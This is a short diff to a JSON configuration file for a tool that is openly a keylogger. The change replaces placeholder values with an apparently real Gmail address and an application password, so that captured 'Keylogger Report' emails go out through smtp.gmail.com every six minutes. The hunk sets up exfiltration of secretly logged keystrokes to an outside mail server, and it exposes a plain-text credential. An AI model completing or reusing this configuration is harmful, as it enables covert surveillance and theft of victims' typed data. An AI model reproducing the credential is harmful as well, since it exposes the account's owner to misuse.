@@ -60,9 +60,9 @@
         "smtp_server": "smtp.gmail.com",
         "smtp_port": 587,
         "use_tls": true,
-        "sender_email": "your_email@gmail.com",
-        "sender_password": "your_application_password",
-        "recipient_email": "recipient_email@gmail.com",
+        "sender_email": "ayoubgoubraim@gmail.com",
+        "sender_password": "eqmy hqrx tkqi ptwu ",
+        "recipient_email": "ayoubgoubraim@gmail.com",
         "subject_prefix": "Keylogger Report",
         "send_interval_hours": 0.1
     },
